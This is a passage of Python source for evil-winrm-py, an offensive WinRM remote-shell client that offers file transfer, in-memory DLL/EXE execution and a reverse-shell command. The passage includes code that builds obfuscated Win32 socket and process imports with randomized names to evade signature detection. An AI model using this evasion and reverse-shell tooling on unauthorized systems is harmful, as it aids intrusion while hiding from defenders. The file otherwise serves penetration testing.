#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
evil-winrm-py
https://github.com/adityatelange/evil-winrm-py
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import re
import shlex
import shutil
import signal
import sys
import tempfile
import textwrap
import time
import traceback
from importlib import resources
from ipaddress import ip_address
from pathlib import Path
from random import randbytes, randint

from prompt_toolkit import PromptSession, prompt
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.document import Document
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import FileHistory
from prompt_toolkit.shortcuts import clear
from pypsrp.complex_objects import PSInvocationState
from pypsrp.exceptions import AuthenticationError, WinRMTransportError, WSManFaultError
from pypsrp.powershell import PowerShell, RunspacePool
from requests.exceptions import ConnectionError
from spnego.exceptions import NoCredentialError, OperationNotAvailableError, SpnegoError
from tqdm import tqdm

# check if kerberos is installed
try:
    from gssapi.creds import Credentials as GSSAPICredentials
    from gssapi.exceptions import ExpiredCredentialsError, MissingCredentialsError
    from gssapi.raw import Creds as RawCreds
    from krb5._exceptions import Krb5Error

    is_kerb_available = True
except ImportError:
    is_kerb_available = False

    # If kerberos is not available, define a dummy exception
    class Krb5Error(Exception):
        pass


from evil_winrm_py import __version__
from evil_winrm_py.pypsrp_ewp.wsman import WSManEWP

# --- Constants ---
LOG_PATH = Path.cwd().joinpath("evil_winrm_py.log")
HISTORY_FILE = Path.home().joinpath(".evil_winrm_py_history")
HISTORY_LENGTH = 1000
MENU_COMMANDS = {
    "upload": {
        "syntax": "upload <local_path> <remote_path>",
        "info": "Upload a file",
    },
    "download": {
        "syntax": "download <remote_path> <local_path>",
        "info": "Download a file",
    },
    "loadps": {
        "syntax": "loadps <local_path>.ps1",
        "info": "Load PowerShell functions from a local script",
    },
    "runps": {
        "syntax": "runps <local_path>.ps1",
        "info": "Run a local PowerShell script on the remote host",
    },
    "loaddll": {
        "syntax": "loaddll <local_path>.dll",
        "info": "Load a local DLL (in-memory) as a module on the remote host",
    },
    "runexe": {
        "syntax": "runexe <local_path>.exe [args]",
        "info": "Upload and execute (in-memory) a local EXE on the remote host",
    },
    "revshell": {
        "syntax": "revshell <IP> <PORT>",
        "info": "Spawn a reverse shell to IP:PORT with stdin/stdout/stderr redirected",
    },
    "menu": {
        "syntax": "menu",
        "info": "Show this menu",
    },
    "clear": {
        "syntax": "clear, cls",
        "info": "Clear the screen",
    },
    "exit": {
        "syntax": "exit",
        "info": "Exit the shell",
    },
}
COMMAND_SUGGESTIONS = []

# --- Revshell DLL Import Helpers ---
# Namespace for dynamically generated types (randomized to evade detection)
_revshell_ns = "A" + randbytes(randint(3, 8)).hex()

# Storage for generated import statements and call signatures
_revshell_imports = {}
_revshell_calls = {}


def _dll_import(ns: str, lib: str, fun: str, sigs: list[str]) -> None:
    """
    Generate obfuscated PowerShell Add-Type statements for DLL imports.
    This creates randomized class and method names to evade signature-based detection.

    Args:
        ns: Namespace for the generated type
        lib: DLL name (e.g., "kernel32", "ws2_32")
        fun: Function name to import (e.g., "CreateProcess", "WSASocket")
        sigs: List of type signatures [return_type, arg1_type, arg2_type, ...]
    """
    cls = f"f{randbytes(randint(3, 8)).hex()}"
    name = f"g{randbytes(randint(3, 8)).hex()}"
    ret = sigs[0]
    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
    dll = "+".join(f'"{c}"' for c in lib)
    entry = "+".join(f'"{c}"' for c in fun)
    code = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
    _revshell_calls[fun] = f"[{ns}.{cls}]::{name}"
    _revshell_imports[fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""


# Generate DLL imports for revshell functionality
_dll_import(
    _revshell_ns,
    "kernel32",
    "CreateProcess",
    [
        "IntPtr",
        "IntPtr",
        "string",
        "IntPtr",
        "IntPtr",
        "bool",
        "uint",
        "IntPtr",
        "IntPtr",
        "Int64[]",
        "byte[]",
    ],
)
_dll_import(_revshell_ns, "ws2_32", "WSAStartup", ["IntPtr", "short", "byte[]"])
_dll_import(
    _revshell_ns,
    "ws2_32",
    "WSASocket",
    ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"],
)
_dll_import(
    _revshell_ns,
    "ws2_32",
    "WSAConnect",
    ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"],
)

# --- Colors ---
# ANSI escape codes for colored output
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
BOLD = "\033[1m"


# --- Logging Setup ---
log = logging.getLogger(__name__)


# --- Helper Functions ---
class DelayedKeyboardInterrupt:
    """
    A context manager to delay the handling of a SIGINT (Ctrl+C) signal until
    the enclosed block of code has completed execution.

    This is useful for ensuring that critical sections of code are not
    interrupted by a keyboard interrupt, while still allowing the signal
    to be handled after the block finishes.
    """

    def __enter__(self):
        self.signal_received = False
        self.old_handler = signal.getsignal(signal.SIGINT)

        def handler(sig, frame):
            print(RED + "\n[-] Caught Ctrl+C. Stopping current command..." + RESET)
            self.signal_received = (sig, frame)

        signal.signal(signal.SIGINT, handler)

    def __exit__(self, type, value, traceback):
        signal.signal(signal.SIGINT, self.old_handler)
        if self.signal_received:
            # raise the signal after the task is done
            self.old_handler(*self.signal_received)


def split_args(cmdline: str) -> list[str]:
    """
    Split a command line string into arguments, handling quoted strings properly.
    This is used for parsing revshell command arguments.
    """
    try:
        args = shlex.split(cmdline, posix=False)
    except ValueError:
        return []

    fixed = []
    for arg in args:
        if arg.startswith('"') and arg.endswith('"'):
            fixed.append(arg[1:-1])
        elif arg.startswith("'") and arg.endswith("'"):
            fixed.append(arg[1:-1])
        else:
            fixed.append(arg)
    return fixed


def run_ps_cmd(r_pool: RunspacePool, command: str) -> tuple[str, list, bool]:
    """Runs a PowerShell command and returns the output, streams, and error status."""
    log.info("Executing command: {}".format(command))
    ps = PowerShell(r_pool)
    ps.add_cmdlet("Invoke-Expression").add_parameter("Command", command)
    ps.add_cmdlet("Out-String").add_parameter("Stream")
    ps.invoke()
    return "\n".join(ps.output), ps.streams, ps.had_errors


def get_prompt(r_pool: RunspacePool) -> str:
    """Returns the prompt string for the interactive shell."""
    output, streams, had_errors = run_ps_cmd(
        r_pool, "$pwd.Path"
    )  # Get current working directory
    if not had_errors:
        return f"{RED}evil-winrm-py{RESET} {YELLOW}{BOLD}PS{RESET} {output}> "
    return "PS ?> "  # Fallback prompt


def show_menu() -> None:
    """Displays the help menu for interactive commands."""
    print(BOLD + "\nMenu:" + RESET)
    for command in MENU_COMMANDS.values():
        print(f"{CYAN}[+] {command['syntax']:<55} - {command['info']}{RESET}")
    print("Note: Use absolute paths for upload/download for reliability.\n")


def get_directory_and_partial_name(text: str, sep: str) -> tuple[str, str]:
    """
    Parses the input text to find the directory prefix and the partial name.
    """
    if sep not in ["\\", "/"]:
        raise ValueError("Separator must be either '\\' or '/'")
    # Find the last unquoted slash or backslash
    last_sep_index = text.rfind(sep)
    if last_sep_index == -1:
        # No separator found, the whole text is the partial name in the current directory
        directory_prefix = ""
        partial_name = text
    else:
        split_at = last_sep_index + 1
        directory_prefix = text[:split_at]
        partial_name = text[split_at:]
    return directory_prefix, partial_name


def _ps_single_quote(value: str) -> str:
    """Wraps a value in single quotes for PowerShell, escaping embedded quotes."""
    escaped = value.replace("'", "''")
    return f"'{escaped}'"


def get_remote_path_suggestions(
    r_pool: RunspacePool,
    directory_prefix: str,
    partial_name: str,
    dirs_only: bool = False,
) -> list[str]:
    """
    Returns a list of remote path suggestions based on the current directory
    and the partial name entered by the user.
    """

    exp = "FullName"
    attrs = ""
    if not re.match(r"^[a-zA-Z]:", directory_prefix):
        # If the path doesn't start with a drive letter, prepend the current directory
        pwd, streams, had_errors = run_ps_cmd(
            r_pool, "$pwd.Path"
        )  # Get current working directory
        directory_prefix = f"{pwd}\\{directory_prefix}"
        exp = "Name"

    if dirs_only:
        attrs = "-Attributes Directory"

    command = f'Get-ChildItem -LiteralPath "{directory_prefix}" -Filter "{partial_name}*" {attrs} -Fo | select -Exp {exp}'
    ps = PowerShell(r_pool)
    ps.add_cmdlet("Invoke-Expression").add_parameter("Command", command)
    ps.add_cmdlet("Out-String").add_parameter("Stream")
    ps.invoke()
    return ps.output


def get_remote_command_suggestions(
    r_pool: RunspacePool, command_prefix: str
) -> list[str]:
    """
    Returns a list of remote PowerShell command names (cmdlets/aliases) that start
    with the provided prefix.
    """

    prefix_literal = _ps_single_quote(command_prefix or "")
    ps_script = textwrap.dedent(
        f"""
        $prefix = {prefix_literal};
        if ([string]::IsNullOrEmpty($prefix)) {{
            $pattern = '*';
        }} else {{
            $pattern = "$prefix*";
        }}
        $cmds = Get-Command -Name $pattern -ErrorAction SilentlyContinue |
            Select-Object -ExpandProperty Name;
        if (-not $cmds) {{
            $cmds = Get-Alias -Name $pattern -ErrorAction SilentlyContinue |
                Select-Object -ExpandProperty Name;
        }}
        $cmds | Sort-Object -Unique
        """
    ).strip()

    output, _, had_errors = run_ps_cmd(r_pool, ps_script)
    if had_errors:
        return []
    suggestions = [line.strip() for line in output.splitlines() if line.strip()]
    return suggestions


def get_local_path_suggestions(
    directory_prefix: str, partial_name: str, extension: str = None
) -> list[str]:
    """
    Returns a list of local path suggestions based on path entered by the user.
    Optionally filters files by extension (e.g., ".ps1").
    """
    suggestions = []

    # Expand the tilde to the user's home directory
    home = str(Path.home())

    try:
        entries = Path(directory_prefix).expanduser().iterdir()
        for entry in entries:
            if entry.match(f"{partial_name}*"):
                if entry.is_dir():
                    entry = (
                        f"{entry}{os.sep}"  # Append a trailing slash for directories
                    )
                    if directory_prefix.startswith("~"):
                        # If the directory prefix starts with ~, replace home with ~
                        entry = str(entry).replace(home, "~", 1)
                    suggestions.append(str(entry))
                else:
                    if (extension is None) or (
                        entry.suffix.lower() == extension.lower()
                    ):
                        if directory_prefix.startswith("~"):
                            # If the directory prefix starts with ~, replace home with ~
                            entry = str(entry).replace(home, "~", 1)
                        suggestions.append(str(entry))
    except (FileNotFoundError, NotADirectoryError, PermissionError):
        pass
    finally:
        if extension:
            # Sort suggestions alphabetically, prioritizing those that match the extension
            return sorted(suggestions, key=lambda x: not x.endswith(extension))
        return suggestions


class CommandPathCompleter(Completer):
    """
    Completer for command paths in the interactive shell.
    This completer suggests command names based on the user's input.
    """

    def __init__(self, r_pool: RunspacePool):
        self.r_pool = r_pool

    def get_completions(self, document: Document, complete_event):
        dirs_only = False  # Whether to suggest only directories
        text_before_cursor = document.text_before_cursor.lstrip()
        tokens = text_before_cursor.split(maxsplit=1)

        if not tokens:  # Empty input, suggest all commands
            for cmd_sugg in list(MENU_COMMANDS.keys()) + COMMAND_SUGGESTIONS:
                yield Completion(cmd_sugg, start_position=0, display=cmd_sugg)
            return

        command_typed_part = tokens[0]

        # Handle .\name or ./name as first-token paths (run from current remote directory)
        if command_typed_part.startswith(".\\") or command_typed_part.startswith("./"):
            path_being_completed = command_typed_part
            # strip surrounding quotes if any
            if path_being_completed.startswith('"') and path_being_completed.endswith(
                '"'
            ):
                path_being_completed = path_being_completed.strip('"')
            directory_prefix, partial_name = get_directory_and_partial_name(
                path_being_completed, sep="\\"
            )
            suggestions = get_remote_path_suggestions(
                self.r_pool, directory_prefix, partial_name
            )
            for sugg_path in suggestions:
                text_to_insert_in_prompt = f".\\" + sugg_path
                if " " in sugg_path:
                    text_to_insert_in_prompt = f'& ".\\{sugg_path}"'
                yield Completion(
                    text_to_insert_in_prompt,
                    start_position=-len(command_typed_part),
                    display=sugg_path,
                )
            return

        # Case 1: Completing the command name itself
        # There's only one token and no trailing space.
        if len(tokens) == 1 and not text_before_cursor.endswith(" "):
            # User is typing the command, -> "downl"
            seen_commands = set()
            for cmd_sugg in list(MENU_COMMANDS.keys()) + COMMAND_SUGGESTIONS:
                if cmd_sugg.startswith(command_typed_part):
                    seen_commands.add(cmd_sugg.lower())
                    yield Completion(
                        cmd_sugg + " ",  # Full suggested command
                        start_position=-len(
                            command_typed_part
                        ),  # Replace the typed part
                        display=cmd_sugg,
                    )
            remote_cmds = get_remote_command_suggestions(
                self.r_pool, command_typed_part
            )
            lower_prefix = command_typed_part.lower()
            for remote_cmd in remote_cmds:
                cmd_lower = remote_cmd.lower()
                if lower_prefix and not cmd_lower.startswith(lower_prefix):
                    continue
                if cmd_lower in seen_commands:
                    continue
                seen_commands.add(cmd_lower)
                yield Completion(
                    remote_cmd + " ",
                    start_position=-len(command_typed_part),
                    display=remote_cmd,
                )
            return

        # Case 2: Completing a path argument
        path_typed_segment = ""  # What the user has typed for the current path argument
        if len(tokens) == 2:
            path_typed_segment = tokens[1]

        actual_command_name = command_typed_part.strip().lower()

        args = quoted_command_split(path_typed_segment.strip())

        suggestions = []
        current_arg_text_being_completed = ""
        directory_prefix = partial_name = ""

        if actual_command_name == "upload":
            # syntax: upload <local_path> <remote_path>
            num_args_present = len(args)

            if num_args_present == 0:
                # User typed "upload "
                # Completing the 1st argument (local_path), currently empty
                current_arg_text_being_completed = ""
                directory_prefix, partial_name = get_directory_and_partial_name(
                    current_arg_text_being_completed, sep=os.sep
                )
                suggestions = get_local_path_suggestions(directory_prefix, partial_name)
            elif num_args_present == 1:
                # We have one argument part, e.g., "upload arg1" or "upload local_path "
                if path_typed_segment.endswith(" "):
                    # 1st argument (local_path) is complete
                    # Completing the 2nd argument (remote_path), currently empty
                    current_arg_text_being_completed = ""
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        current_arg_text_being_completed, sep="\\"
                    )
                    suggestions = get_remote_path_suggestions(
                        self.r_pool, directory_prefix, partial_name
                    )
                else:
                    # Still completing the 1st argument (local_path), e.g., "upload arg1"
                    current_arg_text_being_completed = path_being_completed = args[0]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name
                    )
            elif num_args_present == 2:
                #  We have two argument parts
                # e.g., "upload local_path arg2" or "upload local_path remote_path "
                if path_typed_segment.endswith(" "):
                    # 2nd argument (remote_path) is complete. No more suggestions for "upload".
                    pass
                else:
                    # Completing the 2nd argument (remote_path), e.g., "upload local_path arg2"
                    current_arg_text_being_completed = path_being_completed = args[1]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep="\\"
                    )
                    suggestions = get_remote_path_suggestions(
                        self.r_pool, directory_prefix, partial_name
                    )
            else:
                # More than 2 arguments, e.g., "upload local_path remote_path extra_arg"
                pass
        elif actual_command_name == "download":
            # syntax: download <remote_path> <local_path>
            num_args_present = len(args)

            if num_args_present == 0:
                # User typed "download "
                # Completing 1st arg (remote_path), empty
                current_arg_text_being_completed = ""
                directory_prefix, partial_name = get_directory_and_partial_name(
                    current_arg_text_being_completed, sep="\\"
                )
                suggestions = get_remote_path_suggestions(
                    self.r_pool, directory_prefix, partial_name
                )
            elif num_args_present == 1:
                # We have "download arg1" or "download local_path "
                if path_typed_segment.endswith(" "):
                    # First arg (remote_path) is complete. Completing 2nd arg (local_path), empty.
                    current_arg_text_being_completed = ""
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        current_arg_text_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name
                    )
                else:
                    # Still completing 1st arg (remote_path)
                    current_arg_text_being_completed = path_being_completed = args[0]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep="\\"
                    )
                    suggestions = get_remote_path_suggestions(
                        self.r_pool, directory_prefix, partial_name
                    )
            elif num_args_present == 2:
                # We have two argument parts
                # e.g., "download remote_path arg2" or "download remote_path local_path "
                if path_typed_segment.endswith(" "):
                    # 2nd argument (local_path) is complete. No more suggestions for "download".
                    pass
                else:
                    # Completing 2nd arg (local_path)
                    current_arg_text_being_completed = path_being_completed = args[1]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name
                    )
            else:
                # More than 2 arguments, e.g., "download remote_path local_path extra_arg"
                pass
        elif actual_command_name in ["loadps", "runps"]:
            # syntax: loadps <local_path>
            num_args_present = len(args)

            if num_args_present == 0:
                # User typed "loadps "
                # Completing the 1st argument (local_path), currently empty
                current_arg_text_being_completed = ""
                directory_prefix, partial_name = get_directory_and_partial_name(
                    current_arg_text_being_completed, sep=os.sep
                )
                suggestions = get_local_path_suggestions(
                    directory_prefix, partial_name, extension=".ps1"
                )
            elif num_args_present == 1:
                # We have "loadps arg1" or "loadps local_path "
                if path_typed_segment.endswith(" "):
                    # 1st argument (local_path) is complete, currently empty.
                    current_arg_text_being_completed = ""
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        current_arg_text_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".ps1"
                    )
                else:
                    # Still completing the 1st argument (local_path)
                    current_arg_text_being_completed = path_being_completed = args[0]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".ps1"
                    )
            else:
                # More than 1 argument, e.g., "loadps local_path extra_arg"
                pass
        elif actual_command_name in ["loaddll"]:
            # syntax: loaddll <local_path>
            num_args_present = len(args)

            if num_args_present == 0:
                # User typed "loaddll "
                # Completing the 1st argument (local_path), currently empty
                current_arg_text_being_completed = ""
                directory_prefix, partial_name = get_directory_and_partial_name(
                    current_arg_text_being_completed, sep=os.sep
                )
                suggestions = get_local_path_suggestions(
                    directory_prefix, partial_name, extension=".dll"
                )
            elif num_args_present == 1:
                # We have "loaddll arg1" or "loaddll local_path "
                if path_typed_segment.endswith(" "):
                    # 1st argument (local_path) is complete, currently empty.
                    current_arg_text_being_completed = ""
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        current_arg_text_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".dll"
                    )
                else:
                    # Still completing the 1st argument (local_path)
                    current_arg_text_being_completed = path_being_completed = args[0]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".dll"
                    )
            else:
                # More than 1 argument, e.g., "loaddll local_path extra_arg"
                pass
        elif actual_command_name in ["runexe"]:
            # syntax: runexe <local_path>
            num_args_present = len(args)

            if num_args_present == 0:
                # User typed "runexe "
                # Completing the 1st argument (local_path), currently empty
                current_arg_text_being_completed = ""
                directory_prefix, partial_name = get_directory_and_partial_name(
                    current_arg_text_being_completed, sep=os.sep
                )
                suggestions = get_local_path_suggestions(
                    directory_prefix, partial_name, extension=".exe"
                )
            elif num_args_present == 1:
                # We have "runexe arg1" or "runexe local_path "
                if path_typed_segment.endswith(" "):
                    # 1st argument (local_path) is complete, currently empty.
                    current_arg_text_being_completed = ""
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        current_arg_text_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".exe"
                    )
                else:
                    # Still completing the 1st argument (local_path)
                    current_arg_text_being_completed = path_being_completed = args[0]
                    if path_being_completed.startswith('"'):
                        path_being_completed = current_arg_text_being_completed.strip(
                            '"'
                        )
                    directory_prefix, partial_name = get_directory_and_partial_name(
                        path_being_completed, sep=os.sep
                    )
                    suggestions = get_local_path_suggestions(
                        directory_prefix, partial_name, extension=".exe"
                    )
            else:
                # More than 1 argument, e.g., "runexe local_path extra_arg"
                pass
        else:
            if actual_command_name == "cd":
                dirs_only = True

            current_arg_text_being_completed = path_being_completed = path_typed_segment

            if path_being_completed.startswith('"'):
                path_being_completed = current_arg_text_being_completed.strip('"')

            directory_prefix, partial_name = get_directory_and_partial_name(
                path_being_completed, sep="\\"
            )
            suggestions = get_remote_path_suggestions(
                self.r_pool, directory_prefix, partial_name, dirs_only
            )

        for sugg_path in suggestions:

            # If the path doesn't start with a drive letter, prepend the directory_prefix
            if (
                not re.match(r"^[a-zA-Z]:", directory_prefix)
                and directory_prefix
                and directory_prefix.endswith("\\")
            ):
                sugg_path = f"{directory_prefix}{sugg_path}"

            text_to_insert_in_prompt = sugg_path

            if " " in sugg_path:
                # If the path contains spaces, quote it
                text_to_insert_in_prompt = f'"{sugg_path}"'

            yield Completion(
                text_to_insert_in_prompt,
                start_position=-len(
                    current_arg_text_being_completed
                ),  # Use the length of quoted part
                display=sugg_path,
            )


def get_ps_script(script_name: str) -> str:
    """
    Returns the content of a PowerShell script from the package resources.
    """
    try:
        with resources.path("evil_winrm_py._ps", script_name) as script_path:
            return script_path.read_text()
    except FileNotFoundError:
        print(RED + f"[-] Script {script_name} not found." + RESET)
        log.error(f"Script {script_name} not found.")
        return ""


def quoted_command_split(command: str) -> list[str]:
    """
    Splits a command string into parts, respecting quoted strings.
    This is useful for handling paths with spaces or special characters.
    """
    actual_command_parts = []
    continuation = False
    cursor = 0

    command_parts = command.split(" ")
    for part in command_parts:
        if not part:
            continue
        if continuation:
            actual_command_parts[cursor] = actual_command_parts[cursor] + " " + part
            if part.endswith('"'):
                continuation = False
                cursor += 1
        else:
            if part.startswith('"'):
                actual_command_parts += [part]
                continuation = True
            elif part.find('"') != -1:
                # #TODO: decide later how to handle this case
                pass
            else:
                actual_command_parts += [part]
                cursor += 1
    return actual_command_parts


def download_file(r_pool: RunspacePool, remote_path: str, local_path: str) -> None:
    ps = PowerShell(r_pool)
    script = get_ps_script("fetch.ps1")
    ps.add_script(script)
    ps.add_parameter("FilePath", remote_path)
    ps.begin_invoke()

    ts = int(time.time())
    tmp_file_path = Path(tempfile.gettempdir()) / f"evil-winrm-py.file_{ts}.tmp"

    try:
        # Create a temporary file to store the downloaded data
        with open(tmp_file_path, "ab+") as bin:
            cursor = 0
            metadata = {}
            while ps.state == PSInvocationState.RUNNING:
                with DelayedKeyboardInterrupt():
                    ps.poll_invoke()
                output = ps.output
                if cursor == 0:
                    line = json.loads(output[0])
                    if line["Type"] == "Error":
                        print(RED + f"[-] Error: {line['Message']}" + RESET)
                        log.error(f"Error: {line['Message']}")
                        return
                    elif line["Type"] == "Metadata":
                        metadata = line
                    pbar = tqdm(
                        total=metadata["FileSize"],
                        unit="B",
                        unit_scale=True,
                        unit_divisor=1024,
                        desc=f"Downloading {remote_path}",
                        dynamic_ncols=True,
                        mininterval=0.1,
                    )
                for line in output[cursor:]:
                    line = json.loads(line)
                    if line["Type"] == "Chunk":
                        Base64Data = line["Base64Data"]
                        chunk = base64.b64decode(Base64Data)
                        bin.write(chunk)
                        pbar.update(metadata["ChunkSize"])
                    if line["Type"] == "Error":
                        print(RED + f"[-] Error: {line['Message']}" + RESET)
                        log.error(f"Error: {line['Message']}")
                        return
                cursor = len(output)
            pbar.close()
            bin.close()

        if ps.had_errors:
            if ps.streams.error:
                for error in ps.streams.error:
                    print(error)

    except KeyboardInterrupt:
        if "pbar" in locals() and pbar:
            pbar.leave = (
                False  # Make the progress bar disappear on close after interrupt
            )
            pbar.close()
        Path(tmp_file_path).unlink(missing_ok=True)
        if ps.state == PSInvocationState.RUNNING:
            log.info("Stopping command execution.")
            ps.stop()
        return

    # Verify the downloaded file's hash
    hexdigest = hashlib.md5(open(tmp_file_path, "rb").read()).hexdigest()
    if metadata["FileHash"].lower() == hexdigest:
        # If the hash matches, rename the temporary file to the final name
        tmp_file_path = Path(tmp_file_path)
        try:
            shutil.move(tmp_file_path, local_path)
        except Exception as e:
            print(RED + f"[-] Error saving file: {e}" + RESET)
            log.error(f"Error saving file: {e}")
            return
        print(
            GREEN
            + "[+] File downloaded successfully and saved as: "
            + local_path
            + RESET
        )
        log.info("File downloaded successfully and saved as: {}".format(local_path))
    else:
        print(RED + "[-] File hash mismatch. Downloaded file may be corrupted." + RESET)
        log.error("File hash mismatch. Downloaded file may be corrupted.")


def upload_file(r_pool: RunspacePool, local_path: str, remote_path: str) -> None:
    hexdigest = hashlib.md5(open(local_path, "rb").read()).hexdigest().upper()
    with open(local_path, "rb") as bin:
        file_size = Path(local_path).stat().st_size
        chunk_size_bytes = 65536  # 64 KB
        total_chunks = (file_size + chunk_size_bytes - 1) // chunk_size_bytes
        metadata = {"FileHash": ""}  # Declare a psuedo metadata

        pbar = tqdm(
            total=file_size,
            unit="B",
            unit_scale=True,
            unit_divisor=1024,
            desc=f"Uploading {local_path}",
            dynamic_ncols=True,
            mininterval=0.1,
        )
        try:
            temp_file_path = ""
            for i in range(total_chunks):
                start_offset = i * chunk_size_bytes
                bin.seek(start_offset)
                chunk = bin.read(chunk_size_bytes)

                if not chunk:  # End of file
                    break

                elif i == 0:
                    chunk_type = 0  # First chunk, tells PS script to create file
                    if len(chunk) < chunk_size_bytes:
                        chunk_type = 3
                elif i == total_chunks - 1:
                    chunk_type = 1  # Last chunk, tells PS script to calculate hash
                else:
                    chunk_type = 2  # Intermediate chunk

                base64_chunk = base64.b64encode(chunk).decode("utf-8")

                script = get_ps_script("send.ps1")
                with DelayedKeyboardInterrupt():
                    ps = PowerShell(r_pool)
                    ps.add_script(script)
                    ps.add_parameter("Base64Chunk", base64_chunk)
                    ps.add_parameter("ChunkType", chunk_type)

                    if chunk_type == 1:
                        # If it's the last chunk, we provide the file path and hash
                        ps.add_parameter("TempFilePath", temp_file_path)
                        ps.add_parameter("FilePath", remote_path)
                        ps.add_parameter("FileHash", hexdigest)
                    elif chunk_type == 2:
                        ps.add_parameter("TempFilePath", temp_file_path)
                    elif chunk_type == 3:
                        ps.add_parameter("FilePath", remote_path)
                        ps.add_parameter("FileHash", hexdigest)

                    ps.begin_invoke()

                    while ps.state == PSInvocationState.RUNNING:
                        ps.poll_invoke()
                output = ps.output

                for line in output:
                    line = json.loads(line)
                    if line["Type"] == "Metadata":
                        metadata = line
                        if "TempFilePath" in metadata:
                            temp_file_path = metadata["TempFilePath"]

                    if line["Type"] == "Error":
                        print(RED + f"[-] Error: {line['Message']}" + RESET)
                        log.error(f"Error: {line['Message']}")
                        pbar.leave = False  # Make the progress bar disappear on close
                        return
                if ps.had_errors:
                    if ps.streams.error:
                        for error in ps.streams.error:
                            print(error)
                if chunk_type == 3:
                    pbar.update(file_size)
                else:
                    pbar.update(chunk_size_bytes)
            pbar.close()

            # Verify the downloaded file's hash
            if metadata["FileHash"] == hexdigest:
                print(
                    GREEN
                    + "[+] File uploaded successfully as: "
                    + metadata["FilePath"]
                    + RESET
                )
                log.info(
                    "File uploaded successfully as: {}".format(metadata["FilePath"])
                )
            else:
                print(
                    RED
                    + "[-] File hash mismatch. Uploaded file may be corrupted."
                    + RESET
                )
                log.error("File hash mismatch. Uploaded file may be corrupted.")

        except KeyboardInterrupt:
            if "pbar" in locals() and pbar:
                pbar.leave = (
                    False  # Make the progress bar disappear on close after interrupt
                )
                pbar.close()
            if ps.state == PSInvocationState.RUNNING:
                log.info("Stopping command execution.")
                ps.stop()


def _read_text_auto_encoding(path) -> str:
    """
    Reads file with enc utf-8-sig, utf-8, utf-16, and latin-1.
    Tries multiple encodings to read the file and returns the content as a string.
    Raises UnicodeDecodeError/Exception if all encodings fail.
    """
    text_file_encodings = ["utf-8-sig", "utf-8", "utf-16", "latin-1"]
    for enc in text_file_encodings:
        try:
            with open(path, "r", encoding=enc) as f:
                text = f.read()
            log.debug(f"Read '{path}' using encoding {enc}")
            return text
        except UnicodeDecodeError:
            continue
        except Exception as e:
            raise
    raise UnicodeDecodeError("All preferred encodings failed for file: {}".format(path))


def load_ps(r_pool: RunspacePool, local_path: str):
    ps = PowerShell(r_pool)
    try:
        try:
            script = _read_text_auto_encoding(local_path)
            print(script)
        except Exception as e:
            print(RED + f"[-] Error reading ps script file: {e}" + RESET)
            log.error(f"Error reading ps script file: {e}")
            return
        # Remove block comments (<#...#>) to avoid matching commented-out functions
        content = re.sub(r"<#.*?#>", "", script, flags=re.DOTALL)
        # Find all function names in the script
        pattern = r"function\s+([a-zA-Z0-9_-]+)\s*(?={|$)"
        function_names = re.findall(pattern, content, re.MULTILINE)

        ps.add_script(f". {{ {script} }}")  # Dot sourcing the script
        ps.begin_invoke()

        while ps.state == PSInvocationState.RUNNING:
            with DelayedKeyboardInterrupt():
                ps.poll_invoke()

        if ps.streams.error:
            print(RED + "[-] Failed to load PowerShell script." + RESET)
            log.error(f"Failed to load PowerShell script '{local_path}'.")
            for error in ps.streams.error:
                print(RED + error._to_string + RESET)
                log.error("Error: {}".format(error._to_string))
                log.error("\tCategoryInfo: {}".format(error.message))
                log.error("\tFullyQualifiedErrorId: {}".format(error.fq_error))
        else:
            print(GREEN + "[+] PowerShell script loaded successfully." + RESET)
            log.info(f"PowerShell script '{local_path}' loaded successfully.")
            global COMMAND_SUGGESTIONS
            # Update the command suggestions with the function names
            new_suggestions = []
            for func in function_names:
                if func not in COMMAND_SUGGESTIONS:
                    new_suggestions += [func]
            if new_suggestions:
                COMMAND_SUGGESTIONS += new_suggestions
                print(
